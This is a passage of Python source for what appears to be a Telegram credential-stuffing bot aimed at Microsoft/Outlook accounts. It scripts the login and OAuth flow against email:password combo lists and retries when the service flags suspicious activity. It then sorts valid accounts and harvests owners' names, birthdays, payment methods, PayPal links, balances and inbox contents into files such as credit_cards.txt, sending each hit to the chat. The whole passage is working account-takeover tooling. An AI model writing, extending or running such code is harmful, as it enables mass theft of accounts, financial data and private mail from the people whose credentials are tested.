                f"https://login.live.com/oauth20_authorize.srf"
                f"?client_id={client_id}&response_type=token&scope={scope}"
                f"&redirect_uri=https://login.live.com/oauth20_desktop.srf&prompt=none"
            )
            r = self.session.get(auth_url, timeout=12, verify=False, allow_redirects=True)
            token = parse_qs(urlparse(r.url).fragment).get("access_token", [None])[0]

            base_result = {
                "status": "HIT",
                "platform_counts": {}, "platform_subscriptions": {},
                "details": [], "name": "N/A", "region": "N/A",
                "payment_methods": ["N/A"], "ms_subscriptions": ["N/A"],
                "balance": "", "birthday": "", "age": "",
                "psn_orders": 0, "psn_purchases": [],
                "kw_total": 0, "kw_hits": [], "mc_products": [],
            }

            if not token:
                return base_result

            cid = self.session.cookies.get("MSPCID", "")
            cid = cid.upper() if cid else "0000000000000000"
            kw_total, kw_hits = self.check_inbox_keywords(token, cid)
            base_result["kw_total"] = kw_total
            base_result["kw_hits"] = kw_hits
            base_result["status"] = "HIT" if kw_total > 0 else "FREE"
            return base_result

        except Exception:
            return {"status": "HIT", "platform_counts": {}, "platform_subscriptions": {},
                    "details": [], "name": "N/A", "region": "N/A",
                    "payment_methods": ["N/A"], "ms_subscriptions": ["N/A"],
                    "balance": "", "birthday": "", "age": "",
                    "psn_orders": 0, "psn_purchases": [], "kw_total": 0, "kw_hits": [],
                    "mc_products": []}

    def check_account(self, email, password):
        # Acquire session from pool; always return it afterwards
        self.session = session_pool.get_session()
        try:
            TRANSIENT_ERRORS = ("ERROR_NET", "ERROR_TIMEOUT", "ERROR_SYS", "ERROR_PARAMS", "ERROR_TOKEN", "ERROR_BLOCKED")
            last_result = "ERROR_NET"
            # Retry transient errors up to 2 extra times
            for attempt in range(3):
                result = self._do_check(email, password)
                last_result = result
                if result not in TRANSIENT_ERRORS:
                    return result
                if attempt < 2:
                    wait = 3.0 if result == "ERROR_BLOCKED" else 1.0 * (attempt + 1)
                    logger.debug("Transient error %s for %s, retry %d/2 (wait %.1fs)", result, email, attempt + 1, wait)
                    time.sleep(wait)
                    self.session.cookies.clear()
            # Main flow exhausted — try backup Xbox Live login as last resort
            logger.debug("Main flow failed (%s) for %s — trying backup login", last_result, email)
            backup = self._do_check_backup(email, password)
            if backup is not None:
                return backup
            return last_result
        finally:
            session_pool.return_session(self.session)
            self.session = None

    def _do_check(self, email, password):
        self.session.cookies.clear()
        logger.debug(f"Checking account: {email}")
        try:
            # --- STEP 1: AUTH INIT ---
            url_auth = (
                f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize"
                f"?client_info=1&haschrome=1&login_hint={urllib.parse.quote(email)}"
                f"&client_id={self.client_id}&mkt=en&response_type=code"
                f"&redirect_uri={urllib.parse.quote(self.redirect_uri)}"
                f"&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            )
            headers = {"User-Agent": self.ua, "Connection": "keep-alive"}

            r1 = self.session.get(url_auth, headers=headers, allow_redirects=False, timeout=8)
            if r1.status_code != 302 or "Location" not in r1.headers:
                return "ERROR_NET"

            next_url = r1.headers["Location"]
            r2 = self.session.get(next_url, headers=headers, allow_redirects=False, timeout=8)

            ppft = self.extract_ppft(r2.text)
            url_post = (
                self.get_regex(self.URLPOST_PATTERN1, r2.text) or
                self.get_regex(self.URLPOST_PATTERN2, r2.text)
            )

            if not ppft or not url_post:
                return "ERROR_PARAMS"

            # --- STEP 2: LOGIN ---
            data_login = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11",
                "LoginOptions": "1", "passwd": password, "ps": "2",
                "PPFT": ppft, "PPSX": "Passport", "NewUser": "1", "i19": "3772"
            }
            headers_post = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": self.ua,
                "Connection": "keep-alive",
                "Referer": next_url
            }
            r3 = self.session.post(url_post, data=data_login, headers=headers_post,
                                   allow_redirects=True, timeout=10)
            logger.debug(f"Login POST status: {r3.status_code}")

            r3_text_lower = r3.text.lower()
            bad_keywords = [
                "that microsoft account doesn't exist",
                "account doesn't exist",
                "no account found with that email",
                "your account or password is incorrect",
                "password is incorrect",
                "we couldn't find an account",
                "this username may be incorrect",
            ]
            temp_block_keywords = [
                "try again later", "suspicious activity",
                "we've detected unusual activity",
                "your account has been temporarily",
            ]
            if any(kw in r3_text_lower for kw in temp_block_keywords):
                logger.debug(f"Temporarily blocked for {email}: will retry")
                return "ERROR_BLOCKED"
            if any(kw in r3_text_lower for kw in bad_keywords):
                logger.debug(f"Login failed for {email}: matched bad keyword")
                return "BAD"
            
            # Check for "Stay signed in?" page which sometimes happens
            if "kmsi" in r3_text_lower or "stay signed in" in r3_text_lower:
                logger.debug(f"Handling KMSi for {email}")
                ppft_kmsi = self.extract_ppft(r3.text)
                url_post_kmsi = self.get_regex(self.URLPOST_PATTERN1, r3.text) or self.get_regex(self.URLPOST_PATTERN2, r3.text)
                if ppft_kmsi and url_post_kmsi:
                    data_kmsi = {"LoginOptions": "3", "type": "28", "ctx": "", "PPFT": ppft_kmsi, "i19": "1911"}
                    r3 = self.session.post(url_post_kmsi, data=data_kmsi, headers=headers_post, allow_redirects=True, timeout=10)
                    r3_text_lower = r3.text.lower()
                    logger.debug(f"KMSi POST status: {r3.status_code}")

            # --- STEP 3: OAUTH REDIRECT ---
            # After allow_redirects=True, we might already be at the final URL or need one more jump
            if "code=" in r3.url:
                oauth_url = r3.url
            elif r3.status_code == 302 and "Location" in r3.headers:
                oauth_url = r3.headers["Location"]
            else:
                # Try to find the redirect URL in the page content (JavaScript redirect)
                uaid = (
                    self.get_regex(self.UAID_PATTERN1, r3.text) or
                    self.get_regex(self.UAID_PATTERN2, r3.text)
                )
                opid = self.get_regex(self.OPID_PATTERN, r3.text)
                opidt = self.get_regex(self.OPIDT_PATTERN, r3.text) or ""

                if uaid and opid:
                    oauth_url = (
                        f"https://login.live.com/oauth20_authorize.srf"
                        f"?uaid={uaid}&client_id={self.client_id}"
                        f"&opid={opid}&mkt=EN-US&opidt={opidt}"
                        f"&res=success&route=C105_BAY"
                    )
                else:
                    twofa_keywords = [
                        "verification", "verify", "confirm", "two-step",
                        "authenticator", "phone number", "email code",
                        "prove it", "security info", "unusual activity",
                    ]
                    if any(kw in r3_text_lower for kw in twofa_keywords):
                        logger.debug(f"2FA detected for {email}")
                        return "2FA"
                    logger.debug(f"Login failed for {email}: No redirect found")
                    return "BAD"

            # --- STEP 4: GET CODE ---
            code = None
            if oauth_url.startswith("msauth://"):
                code = self.get_regex(self.CODE_PATTERN, oauth_url)
            else:
                r4 = self.session.get(oauth_url, allow_redirects=False, timeout=8)
                location = r4.headers.get("Location", "")
                code = self.get_regex(self.CODE_PATTERN, location)

            if not code:
                return "2FA"

            # --- STEP 5: GET TOKEN ---
            data_token = {
                "client_info": "1",
                "client_id": self.client_id,
                "redirect_uri": self.redirect_uri,
                "grant_type": "authorization_code",
                "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            r5 = self.session.post(
                "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                data=data_token, timeout=8
            )

            if r5.status_code == 200:
                token_data = r5.json()
                token = token_data.get("access_token", "")
                id_token = token_data.get("id_token", "")
                refresh_token = token_data.get("refresh_token", "")
                mspcid = self.session.cookies.get("MSPCID", "")
                cid = mspcid.upper() if mspcid else "0000000000000000"

                return self.search_emails_by_sender(
                    token, cid, email, password,
                    id_token=id_token, refresh_token=refresh_token
                )
            else:
                return "ERROR_TOKEN"

        except requests.exceptions.Timeout:
            return "ERROR_TIMEOUT"
        except requests.exceptions.ConnectionError:
            return "ERROR_NET"
        except Exception as e:
            logger.debug(f"ERROR_SYS for {email}: {type(e).__name__}: {e}")
            return "ERROR_SYS"


# ================= RESULT MANAGER =================
class ResultManager:
    def __init__(self, combo_filename, base_dir=None):
        if base_dir is None:
            base_dir = RESULT_BASE_DIR
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = re.sub(r'[^\w\-.]', '_', combo_filename)
        self.base_folder = os.path.join(base_dir, f"({timestamp})_{safe_name}_multi_hits")
        self.hits_file      = os.path.join(self.base_folder, "hits.txt")
        self.valid_file     = os.path.join(self.base_folder, "valid.txt")
        self.all_valid_file = os.path.join(self.base_folder, "all_valid.txt")
        self.xboxgp_file    = os.path.join(self.base_folder, "xboxgp.txt")
        self.ms_file        = os.path.join(self.base_folder, "ms.txt")
        self.free_file      = os.path.join(self.base_folder, "free.txt")
        self.cc_file        = os.path.join(self.base_folder, "credit_cards.txt")
        self.paypal_file    = os.path.join(self.base_folder, "paypal.txt")
        self.psn_file       = os.path.join(self.base_folder, "psn.txt")
        self.services_folder = os.path.join(self.base_folder, "services")
        Path(self.services_folder).mkdir(parents=True, exist_ok=True)

    @staticmethod
    def _build_premium_str(platform_subscriptions, platform_counts, separator=" | "):
        premium_order = [
            "Netflix", "Crunchyroll", "Disney+", "Amazon Prime Video", "HBO Max", "Apple TV+",
            "Spotify", "Apple Music", "Deezer", "YouTube Music", "Tidal",
            "PlayStation", "Xbox", "EA", "Twitch",
            "TikTok", "Facebook", "Instagram", "LinkedIn",
            "Discord", "Reddit", "Patreon", "Kick",
            "GitHub", "Udemy", "Coursera", "Binance",
        ]
        parts = []
        for plat in premium_order:
            if plat in platform_subscriptions:
                emoji = PLATFORM_EMOJIS.get(plat, "✅")
                tier = platform_subscriptions[plat]
                count = platform_counts.get(plat, 0)
                if tier and tier != "✓":
                    parts.append(f"{emoji} {plat} [{tier} ✓] ({count} emails)")
                else:
                    parts.append(f"{emoji} {plat} ✓ ({count} emails)")
        return separator.join(parts)

    @staticmethod
    def _format_entry(email, password, result_data):
        name = result_data.get("name", "") if result_data else ""
        region = result_data.get("region", "") if result_data else ""
        balance = result_data.get("balance", "") if result_data else ""
        payment_methods = result_data.get("payment_methods", []) if result_data else []
        ms_subs = result_data.get("ms_subscriptions", []) if result_data else []
        platform_counts = result_data.get("platform_counts", {}) if result_data else {}
        platform_subscriptions = result_data.get("platform_subscriptions", {}) if result_data else {}
        birthday = result_data.get("birthday", "") if result_data else ""
        age = result_data.get("age", "") if result_data else ""
        psn_orders = result_data.get("psn_orders", 0) if result_data else 0
        psn_purchases = result_data.get("psn_purchases", []) if result_data else []
        kw_hits = result_data.get("kw_hits", []) if result_data else []
        kw_total = result_data.get("kw_total", 0) if result_data else 0
        mc_products = result_data.get("mc_products", []) if result_data else []

        # ── Region fallback: use email TLD when API returns nothing ────────────
        if not region or region == "N/A":
            region = region_from_email(email) or "N/A"

        # ── Subscriptions: Microsoft subscriptions only (Xbox GP, Office 365…) ──
        clean_ms_subs = [s for s in ms_subs if s and s != "N/A"]
        subs_val = ", ".join(clean_ms_subs) if clean_ms_subs else "N/A"

        # ── Payment: only show when actually found ─────────────────────────────
        clean_payment = [p for p in payment_methods if p and p != "N/A"]
        payment_val = " / ".join(clean_payment) if clean_payment else ""

        # ── Inbox summary ──────────────────────────────────────────────────────
        inbox_str = (
            ", ".join([f"{p}: {c}" for p, c in sorted(platform_counts.items())])
            if platform_counts else ""
        )

        sep = "-" * 60
        name_val = name if name and name != "N/A" else "N/A"
        region_val = region if region and region != "N/A" else "N/A"

        parts = [f"{email}:{password}", name_val, region_val, f"subscriptions: {subs_val}"]
        if payment_val:
            parts.append(f"Payment: {payment_val}")
        line1 = " | ".join(parts)

        lines = [line1]
        if inbox_str:
            lines.append(f"inbox: {inbox_str}")
        if kw_hits:
            lines.append(f"keywords ({kw_total} emails): {', '.join(kw_hits)}")
        if mc_products:
            lines.append(f"mc/xbox entitlements: {', '.join(mc_products)}")
        lines.append(sep)
        return "\n".join(lines) + "\n"

    @staticmethod
    def _format_telegram_hit(email, password, result_data):
        name = result_data.get("name", "") if result_data else ""
        region = result_data.get("region", "") if result_data else ""
        balance = result_data.get("balance", "") if result_data else ""
        payment_methods = result_data.get("payment_methods", []) if result_data else []
        ms_subs = result_data.get("ms_subscriptions", []) if result_data else []
        platform_counts = result_data.get("platform_counts", {}) if result_data else {}
        platform_subscriptions = result_data.get("platform_subscriptions", {}) if result_data else {}
        birthday = result_data.get("birthday", "") if result_data else ""
        age = result_data.get("age", "") if result_data else ""
        psn_orders = result_data.get("psn_orders", 0) if result_data else 0
        psn_purchases = result_data.get("psn_purchases", []) if result_data else []

        # Region fallback from email TLD
        if not region or region == "N/A":
            region = region_from_email(email) or ""

        flag = get_flag(region)
        safe_email = email.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        safe_pass = password.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

        lines = [
            "🎯 <b>NEW HIT FOUND!</b>",
            "",
            f"✉️ <code>{safe_email}:{safe_pass}</code>",
        ]

        if name and name != "N/A":
            region_part = f" | {flag} {region}" if region and region != "N/A" else ""
            lines.append(f"👤 <b>{name}</b>{region_part}")
        elif region and region != "N/A":
            lines.append(f"{flag} <b>{region}</b>")

        if birthday:
            age_str = f" (Age: {age})" if age else ""
            lines.append(f"🎂 Birthday: <b>{birthday}</b>{age_str}")

        if balance:
            lines.append(f"💰 <b>Balance: {balance}</b>")

        pay_clean = [p for p in payment_methods if p and p != "N/A"]
        if pay_clean:
            lines.append(f"💳 Payment: {' / '.join(pay_clean)}")

        subs_clean = [s for s in ms_subs if s and s != "N/A"]
        if subs_clean:
            lines.append(f"📦 MS Subs: {', '.join(subs_clean)}")

        if psn_orders:
            lines.append(f"🎮 <b>PSN Orders: {psn_orders}</b>")
            for i, p in enumerate(psn_purchases[:3], 1):
                item = p.get("item", "")
                price = p.get("price", "")
                date = p.get("date", "")
                pline = f"  {i}. {item}"
                if price:
                    pline += f" | 💰 {price}"
                if date:
                    pline += f" | 📅 {date}"
                lines.append(pline)

        premium_order = [
            "Netflix", "Crunchyroll", "Disney+", "Amazon Prime Video", "HBO Max", "Apple TV+",
            "Spotify", "Apple Music", "Deezer", "YouTube Music", "Tidal",
            "PlayStation", "Xbox", "EA", "Twitch",
            "TikTok", "Facebook", "Instagram", "LinkedIn",
            "Discord", "Reddit", "Patreon", "Kick",
            "GitHub", "Udemy", "Coursera", "Binance",
        ]

        premium_lines = []
        for plat in premium_order:
            if plat in platform_subscriptions:
                emoji = PLATFORM_EMOJIS.get(plat, "✅")
                tier = platform_subscriptions[plat]
                count = platform_counts.get(plat, 0)
                if tier and tier != "✓":
                    premium_lines.append(f"{emoji} {plat} [{tier} ✓] ({count} emails)")
                else:
                    premium_lines.append(f"{emoji} {plat} ✓ ({count} emails)")

        service_parts = []
        for plat, count in sorted(platform_counts.items(), key=lambda x: x[1], reverse=True):
            if plat not in platform_subscriptions:
                emoji = PLATFORM_EMOJIS.get(plat, "•")
                service_parts.append(f"{emoji} {plat} ({count})")

        if premium_lines:
            lines.append("")
            lines.append("━━━ 🔥 PREMIUM ━━━")
            lines.extend(premium_lines)

        if service_parts:
            lines.append(f"📥 Services: {' | '.join(service_parts[:8])}")

        kw_hits = result_data.get("kw_hits", []) if result_data else []
        kw_total = result_data.get("kw_total", 0) if result_data else 0
        if kw_hits:
            lines.append("")
            lines.append(f"🔑 <b>Keyword Inbox ({kw_total} emails):</b>")
            lines.append(", ".join(kw_hits[:15]))

        mc_products = result_data.get("mc_products", []) if result_data else []
        if mc_products:
            lines.append("")
            lines.append("🎮 <b>Minecraft / Xbox Entitlements:</b>")
            lines.append(", ".join(mc_products))

        return "\n".join(lines)

    def save_hit(self, email, password, result_data):
        entry = self._format_entry(email, password, result_data)

        # hits.txt — full capture
        with open(self.hits_file, 'a', encoding='utf-8') as f:
            f.write(entry)

        # valid.txt — email:password only (no capture)
        with open(self.valid_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

        # all_valid.txt — hits + free, email:password only
        with open(self.all_valid_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

        ms_subs = result_data.get("ms_subscriptions", []) if result_data else []
        active_ms = [s for s in ms_subs if s and s != "N/A"]
        mc_products = result_data.get("mc_products", []) if result_data else []
        payment_methods = result_data.get("payment_methods", []) if result_data else []
        psn_orders = result_data.get("psn_orders", 0) if result_data else 0
        balance = result_data.get("balance", "") if result_data else ""

        # xboxgp.txt — accounts with any Xbox Game Pass subscription
        xbox_keywords = ["game pass", "gamepass", "xbox"]
        gp_from_ms = next(
            (s for s in active_ms if any(kw in s.lower() for kw in xbox_keywords)), None
        )
        gp_from_mc = next(
            (p for p in mc_products if any(kw in p.lower() for kw in xbox_keywords)), None
        )
        gp_label = gp_from_mc or gp_from_ms
        if gp_label:
            with open(self.xboxgp_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | {gp_label}\n")

        # ms.txt — all accounts with any Microsoft subscription OR Minecraft entitlement
        all_products = list(active_ms)
        for p in mc_products:
            if p not in all_products:
                all_products.append(p)
        if all_products:
            subs_str = " | ".join(all_products)
            with open(self.ms_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | {subs_str}\n")

        # credit_cards.txt — accounts with any payment method that isn't PayPal
        clean_payment = [p for p in payment_methods if p and p != "N/A"]
        cc_methods = [p for p in clean_payment if "paypal" not in p.lower()]
        paypal_methods = [p for p in clean_payment if "paypal" in p.lower()]
        if cc_methods:
            with open(self.cc_file, 'a', encoding='utf-8') as f:
                bal_str = f" | Balance: {balance}" if balance else ""
                f.write(f"{email}:{password} | {' / '.join(cc_methods)}{bal_str}\n")

        # paypal.txt — accounts with PayPal linked
        if paypal_methods:
            with open(self.paypal_file, 'a', encoding='utf-8') as f:
                bal_str = f" | Balance: {balance}" if balance else ""
                f.write(f"{email}:{password} | {' / '.join(paypal_methods)}{bal_str}\n")

        # psn.txt — accounts with PSN purchase history
        if psn_orders > 0:
            with open(self.psn_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password} | PSN Orders: {psn_orders}\n")

        # per-service files inside services/
        platform_counts = result_data.get("platform_counts", {}) if result_data else {}
        for platform in platform_counts.keys():
            safe_platform = re.sub(r'[^\w\-. ]', '_', platform)
            service_file = os.path.join(self.services_folder, f"{safe_platform}_hits.txt")
            with open(service_file, 'a', encoding='utf-8') as f:
                f.write(entry)

    def save_free(self, email, password, result_data=None):
        entry = self._format_entry(email, password, result_data)
        with open(self.free_file, 'a', encoding='utf-8') as f:
            f.write(entry)

        # all_valid.txt — hits + free, email:password only
        with open(self.all_valid_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")


# ================= JOB CLASS =================
# Monotonic counter used to break priority ties in the PriorityQueue
_job_counter = itertools.count()


class Job:
    def __init__(self, user_id, chat_id, combo_list, filename, priority=1):
        self.user_id = user_id
        self.chat_id = chat_id
        self.combo_list = combo_list
        self.filename = filename
        self.total = len(combo_list)
        self.checked = 0
        self.hits = 0
        self.free = 0
        self.bads = 0
        self.twofa = 0
        self.errors = 0
        self.start_time = None
        self.status = "queued"
        self.last_hits = deque(maxlen=5)
        self.dashboard_msg_id = None
        self.result_manager = None
        self.priority = priority
        self.platform_totals: Dict[str, int] = {}
        self.psn_hits = 0
        self.xbox_ultimate = 0
        self.xbox_other = 0
        self.office_hits = 0
        self.ms_hits = 0
        self.cc_hits = 0
        self.paypal_hits = 0
        self._seq = next(_job_counter)
        # asyncio objects created lazily inside event loop
        self._lock = None
        self._cancel_event = None

    @property
    def lock(self):
        if self._lock is None:
            self._lock = asyncio.Lock()
        return self._lock

    @property
    def cancel_event(self):
        if self._cancel_event is None:
            self._cancel_event = asyncio.Event()
        return self._cancel_event

    def __lt__(self, other):
        if self.priority != other.priority:
            return self.priority < other.priority
        return self._seq < other._seq


# ================= DASHBOARD FORMATTER =================
def format_dashboard_html(job: Job, speed=0.0, eta="--"):
    completed = (job.checked / job.total * 100) if job.total else 0
    success_rate = (job.hits / job.checked * 100) if job.checked else 0

    # Progress bar
    bar_fill = int(completed / 5)
    bar = "█" * bar_fill + "░" * (20 - bar_fill)

    last_hits_lines = []
    for email, platforms in job.last_hits:
        safe_email = email.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        plat_str = ", ".join(str(p) for p in platforms) if platforms else "?"
        last_hits_lines.append(f"  ✉️ {safe_email} | {plat_str}")
    last_hits_text = "\n".join(last_hits_lines) if last_hits_lines else "  No hits yet..."

    # Top platforms
    if job.platform_totals:
        top_plats = sorted(job.platform_totals.items(), key=lambda x: x[1], reverse=True)[:6]
        plat_lines = "  " + " | ".join(
            f"{PLATFORM_EMOJIS.get(p, '•')} {p}: {c}" for p, c in top_plats
        )
    else:
        plat_lines = "  None detected yet..."

    # MS / Xbox / Office / PSN / CC / PayPal breakdown
    breakdown_parts = []
    if job.xbox_ultimate:
        breakdown_parts.append(f"🎮 GP Ultimate: <code>{job.xbox_ultimate}</code>")
    if job.xbox_other:
        breakdown_parts.append(f"🎮 GP Other: <code>{job.xbox_other}</code>")
    if job.office_hits:
        breakdown_parts.append(f"💼 Office/M365: <code>{job.office_hits}</code>")
    if job.psn_hits:
        breakdown_parts.append(f"🕹 PSN Orders: <code>{job.psn_hits}</code>")
    if job.cc_hits:
        breakdown_parts.append(f"💳 Credit Cards: <code>{job.cc_hits}</code>")
    if job.paypal_hits:
        breakdown_parts.append(f"🅿️ PayPal: <code>{job.paypal_hits}</code>")
    breakdown_line = ("• " + "  |  ".join(breakdown_parts) + "\n") if breakdown_parts else ""

    return (
        f"🚀 <b>LIVE CHECKER DASHBOARD</b>\n"
        f"<code>[{bar}] {completed:.1f}%</code>\n\n"
        f"📊 <b>PROGRESS</b>\n"
        f"• Checked: <code>{job.checked}/{job.total}</code>\n"
        f"• ⚡ Speed: <code>{speed:.1f} acc/s</code>  🕒 ETA: <code>{eta}</code>\n\n"
        f"⚡ <b>RESULTS</b>\n"
        f"• 🎯 HIT: <code>{job.hits}</code>  |  🆓 FREE: <code>{job.free}</code>\n"
        f"• ❌ BAD: <code>{job.bads}</code>  |  🔐 2FA: <code>{job.twofa}</code>  |  ⚠️ ERR: <code>{job.errors}</code>\n"
        f"• 📈 Hit Rate: <code>{success_rate:.1f}%</code>\n"
        f"• 🪟 MS Subs: <code>{job.ms_hits}</code>  |  🎮 GamePass: <code>{job.xbox_ultimate + job.xbox_other}</code>  (Ult: <code>{job.xbox_ultimate}</code>)\n"
        f"• 💳 Cards: <code>{job.cc_hits}</code>  |  🅿️ PayPal: <code>{job.paypal_hits}</code>  |  🕹 PSN: <code>{job.psn_hits}</code>\n"
        f"{breakdown_line}\n"
        f"🏆 <b>TOP SERVICES FOUND:</b>\n{plat_lines}\n\n"
        f"🔔 <b>LAST {len(job.last_hits)} HITS:</b>\n{last_hits_text}\n\n"
        f"⏰ <code>{datetime.now().strftime('%H:%M:%S')}</code>\n"
    )


# ================= GLOBAL QUEUE & EXECUTOR =================
# Initialized in post_init to avoid creating asyncio objects outside the event loop
job_queue: Optional[asyncio.PriorityQueue] = None
user_jobs: Dict[int, Job] = {}
executor = ThreadPoolExecutor(max_workers=THREADS_PER_JOB * MAX_CONCURRENT_JOBS)


# ================= PROCESSING FUNCTIONS =================
async def update_dashboard(job: Job, bot):
    from telegram.error import RetryAfter
    elapsed = time.time() - job.start_time if job.start_time else 0
    speed = job.checked / elapsed if elapsed > 0 else 0
    remaining = (job.total - job.checked) / speed if speed > 0 else 0
    eta = f"{int(remaining // 60)}m {int(remaining % 60)}s" if remaining else "--"

    text = format_dashboard_html(job, speed, eta)
    try:
        await bot.edit_message_text(
            chat_id=job.chat_id,
            message_id=job.dashboard_msg_id,
            text=text,
            parse_mode=ParseMode.HTML
        )
    except RetryAfter:
        pass
    except Exception:
        pass


async def safe_send(bot, chat_id, text, parse_mode=None, **kwargs):
    from telegram.error import RetryAfter, TimedOut
    for attempt in range(4):
        try:
            return await bot.send_message(chat_id=chat_id, text=text, parse_mode=parse_mode, **kwargs)
        except RetryAfter as e:
            wait = e.retry_after + 1
            logger.warning("Flood control hit — waiting %ds before retry", wait)
            await asyncio.sleep(wait)
        except TimedOut:
            await asyncio.sleep(3)
        except Exception:
            raise
    return None


async def safe_send_doc(bot, chat_id, document, caption=None, parse_mode=None, **kwargs):
    from telegram.error import RetryAfter, TimedOut
    for attempt in range(4):
        try:
            document.seek(0)
            return await bot.send_document(
                chat_id=chat_id, document=document,
                caption=caption, parse_mode=parse_mode, **kwargs
            )
        except RetryAfter as e:
            wait = e.retry_after + 1
            logger.warning("Flood control (doc) — waiting %ds before retry", wait)
            await asyncio.sleep(wait)
        except TimedOut:
            await asyncio.sleep(3)
        except Exception:
            raise
    return None


async def process_job(job: Job, bot):
    job.status = "running"
    job.start_time = time.time()
    job.result_manager = ResultManager(
        combo_filename=job.filename,
        base_dir=f"{RESULT_BASE_DIR}/{job.user_id}"
    )

    hit_accounts = []
    free_accounts = []

    account_queue = asyncio.Queue()
    for email, pwd in job.combo_list:
        await account_queue.put((email, pwd))

    # Notification queue — hit messages sent at a controlled rate to avoid flood control
    notif_queue: asyncio.Queue = asyncio.Queue()

    async def notif_sender():
        from telegram.error import RetryAfter, TimedOut
        while True:
            item = await notif_queue.get()
            if item is None:
                break
            for attempt in range(3):
                try:
                    await bot.send_message(chat_id=job.chat_id, text=item, parse_mode=ParseMode.HTML)
                    await asyncio.sleep(0.5)
                    break
                except RetryAfter as e:
                    await asyncio.sleep(e.retry_after + 1)
                except TimedOut:
                    await asyncio.sleep(2)
                except Exception:
                    break
            notif_queue.task_done()

    notif_task = asyncio.create_task(notif_sender())

    async def update_stats(result, email, pwd):
        async with job.lock:
            job.checked += 1
            if isinstance(result, dict) and result.get("status") == "HIT":
                platform_counts = result.get("platform_counts", {})
                _pay = [p for p in result.get("payment_methods", []) if p and p != "N/A"]
                _subs = [s for s in result.get("ms_subscriptions", []) if s and s != "N/A"]
                _has_anything = (
                    bool(platform_counts)
                    or result.get("kw_total", 0) > 0
                    or bool(_pay)
                    or bool(_subs)
                    or result.get("psn_orders", 0) > 0
                )
                if not _has_anything:
                    job.free += 1
                    job.result_manager.save_free(email, pwd, result)
                    free_accounts.append((email, pwd, result))
                    if job.checked % DASHBOARD_UPDATE_INTERVAL == 0 or job.checked == job.total:
                        await update_dashboard(job, bot)
                    return
                job.hits += 1
                platforms_list = list(platform_counts.keys())
                job.last_hits.append((email, platforms_list))
                job.result_manager.save_hit(email, pwd, result)
                hit_accounts.append((email, pwd, result))
                user = get_user(job.user_id)
                update_user(job.user_id, {"total_hits": user["total_hits"] + 1})

                # Update live platform totals
                for plat, cnt in platform_counts.items():
                    job.platform_totals[plat] = job.platform_totals.get(plat, 0) + cnt

                # Track PSN / Xbox / MS / Office / CC / PayPal breakdown
                if result.get("psn_orders", 0) > 0:
                    job.psn_hits += 1
                active_subs = [s for s in result.get("ms_subscriptions", []) if s and s != "N/A"]
                if active_subs:
                    job.ms_hits += 1
                for sub in active_subs:
                    sub_l = sub.lower()
                    if "ultimate" in sub_l:
                        job.xbox_ultimate += 1
                    elif "game pass" in sub_l or "gamepass" in sub_l:
                        job.xbox_other += 1
                    elif "office" in sub_l or "microsoft 365" in sub_l or "m365" in sub_l:
                        job.office_hits += 1
                pay_methods = [p for p in result.get("payment_methods", []) if p and p != "N/A"]
                if any("paypal" in p.lower() for p in pay_methods):
                    job.paypal_hits += 1
                if any("paypal" not in p.lower() for p in pay_methods):
                    job.cc_hits += 1

                # Log the hit
                ms_subs = result.get("ms_subscriptions", [])
                logger.info("HIT: %s | region=%s | subs=%s | platforms=%s",
                            email,
                            result.get("region", "N/A"),
                            ", ".join(s for s in ms_subs if s != "N/A") or "none",
                            ", ".join(platforms_list[:5]))

                # Queue hit notification — sent by background sender to avoid flood control
                try:
                    notif = ResultManager._format_telegram_hit(email, pwd, result)
                    notif_queue.put_nowait(notif)
                except Exception:
                    pass

            elif isinstance(result, dict) and result.get("status") == "FREE":
                job.free += 1
                job.result_manager.save_free(email, pwd, result)
                free_accounts.append((email, pwd, result))
            elif result == "BAD":
                job.bads += 1
            elif result == "2FA":
                job.twofa += 1
            else:
                job.errors += 1

            if job.checked % DASHBOARD_UPDATE_INTERVAL == 0 or job.checked == job.total:
                await update_dashboard(job, bot)

    async def worker(worker_id):
        loop = asyncio.get_running_loop()
        while not job.cancel_event.is_set():
            try:
                email, pwd = await asyncio.wait_for(account_queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                break

            checker = OutlookSenderChecker()
            raw_result = await loop.run_in_executor(executor, checker.check_account, email, pwd)
            await update_stats(raw_result, email, pwd)
            account_queue.task_done()

    workers = [asyncio.create_task(worker(i)) for i in range(THREADS_PER_JOB)]

    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        job.cancel_event.set()
        await asyncio.gather(*workers, return_exceptions=True)
        job.status = "cancelled"
    else:
        job.status = "completed"
    finally:
        # Stop the notification sender and wait for remaining queued messages
        await notif_queue.put(None)
        await notif_task
        await update_dashboard(job, bot)

        files_sent = []

        if hit_accounts:
            # hits.txt — full capture with all details
            hit_content = "".join(
                ResultManager._format_entry(e, p, rd if isinstance(rd, dict) else None)
                for e, p, rd in hit_accounts
            )
            hit_file = io.BytesIO(hit_content.encode())
            hit_file.name = f"@Hotma1lch3ckerBot_hits_{job.user_id}.txt"
            await safe_send_doc(
                bot, job.chat_id, hit_file,
                caption=f"🎯 *hits.txt — Full Capture: {len(hit_accounts)} accounts*",
                parse_mode=ParseMode.MARKDOWN
            )
            files_sent.append("hits.txt")

            # valid.txt — email:password only
            valid_content = "\n".join(f"{e}:{p}" for e, p, _ in hit_accounts) + "\n"
            valid_file = io.BytesIO(valid_content.encode())
            valid_file.name = f"@Hotma1lch3ckerBot_valid_{job.user_id}.txt"
            await safe_send_doc(
                bot, job.chat_id, valid_file,
                caption=f"✅ *valid.txt — Clean combos: {len(hit_accounts)}*",
                parse_mode=ParseMode.MARKDOWN
            )
            files_sent.append("valid.txt")

